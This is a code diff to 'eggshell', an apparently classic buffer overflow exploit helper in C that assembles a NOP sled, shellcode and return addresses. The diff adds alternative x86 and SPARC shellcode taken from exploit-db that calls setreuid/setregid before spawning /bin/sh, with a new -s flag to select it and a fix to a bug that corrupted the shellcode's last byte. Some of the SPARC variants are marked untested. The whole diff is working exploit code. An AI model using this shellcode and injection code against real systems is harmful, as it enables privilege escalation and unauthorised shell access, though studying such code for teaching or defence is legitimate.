@@ -5,6 +5,11 @@ char shellcode[] =
     "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
     "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
     "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+// Alternative shellcode also executing setreuid(geteuid(), geteuid()) (https://www.exploit-db.com/exploits/13338)
+char *alt_shellcode =
+    "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50"
+    "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31"
+    "\xd2\xb0\x0b\xcd\x80";
 unsigned long get_sp(void) {
     __asm__("movl %esp,%eax");
 }
@@ -16,6 +21,18 @@ char shellcode[] =
     "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
     "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
     "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+// Alternative shellcode also executing setreuid(geteuid()), setregid(getegid()) (https://www.exploit-db.com/shellcodes/43621)
+// ATTENTION: NOT TESTED
+char *alt_shellcode =
+    "\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
+    "\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
+    "\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
+    "\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
+    "\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
+    "\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
+    "\x82\x10\x20\x01\x91\xd0\x20\x08";
 unsigned long get_sp(void) {
     __asm__("or %sp, %sp, %i0");
 }
@@ -27,6 +44,18 @@ char shellcode[] =
     "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
     "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
     "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+// Alternative shellcode also executing setreuid(geteuid()), setregid(getegid()) (https://www.exploit-db.com/shellcodes/43621)
+// ATTENTION: NOT TESTED
+char *alt_shellcode =
+    "\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
+    "\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+    "\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
+    "\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
+    "\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
+    "\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
+    "\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
+    "\x82\x10\x20\x01\x91\xd0\x20\x08";
 unsigned long get_sp(void) {
     __asm__("or %sp, %sp, %i0");
 }
@@ -49,12 +78,14 @@ unsigned long get_sp(void) {
 void usage(void);
 
 void main(int argc, char *argv[]) {
-    char *ptr, *bof, *egg;
+    char *ptr, *bof, *egg, *sc;
     long *addr_ptr, addr;
     int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
     int i, n, m, c, align = 0, eggsize = DEFAULT_EGG_SIZE;
+    // Point to normal shellcode by default
+    sc = shellcode;
 
-    while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
+    while ((c = getopt(argc, argv, "a:b:e:o:s")) != EOF)
         switch (c) {
             case 'a':
                 align = atoi(optarg);
@@ -68,12 +99,15 @@ void main(int argc, char *argv[]) {
             case 'o':
                 offset = atoi(optarg);
                 break;
+            case 's':
+                sc = alt_shellcode;
+                break;
             case '?':
                 usage();
                 exit(0);
         }
 
-    if (strlen(shellcode) > eggsize) {
+    if (strlen(sc) > eggsize) {
         printf("Shellcode is larger the the egg.\n");
         exit(0);
     }
@@ -96,7 +130,7 @@ void main(int argc, char *argv[]) {
         *(addr_ptr++) = addr;
 
     ptr = egg;
-    for (i = 0; i < eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE) {
+    for (i = 0; i < eggsize - strlen(sc) - NOP_SIZE; i += NOP_SIZE) {
         // Fixed error here: was i <=, has to be i <
         // Otherwise, the last byte of the shellcode is overwritten with 0x00 below
         for (n = 0; n < NOP_SIZE; n++) {
@@ -104,8 +138,8 @@ void main(int argc, char *argv[]) {
             *(ptr++) = nop[m];
         }
     }
-    for (i = 0; i < strlen(shellcode); i++)
-        *(ptr++) = shellcode[i];
+    for (i = 0; i < strlen(sc); i++)
+        *(ptr++) = sc[i];
 
     bof[bsize - 1] = '\0';
     egg[eggsize - 1] = '\0';
@@ -118,5 +152,5 @@ void main(int argc, char *argv[]) {
 }
 
 void usage(void) {
-    fprintf(stderr, "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\n");
+    fprintf(stderr, "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>] [-s]\n");
 }
